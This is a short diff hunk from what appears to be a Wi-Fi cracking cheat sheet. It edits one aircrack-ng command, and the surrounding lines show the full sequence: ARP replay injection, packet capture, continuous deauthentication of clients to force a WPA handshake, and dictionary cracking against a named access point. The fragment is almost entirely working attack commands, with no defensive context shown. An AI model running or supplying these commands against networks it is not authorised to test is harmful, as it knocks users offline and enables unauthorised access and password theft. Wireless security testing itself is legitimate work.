@@ -51,7 +51,7 @@ aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
 airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w out mon0
 aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
 (wait handshake)
-aircrack-ng -w password.txt -b 00:14:6C:7E:40:80 out*.cap 
+aircrack-ng -w password.txt out*.cap 
 ```
 
 ## Crack WEP by ARP request
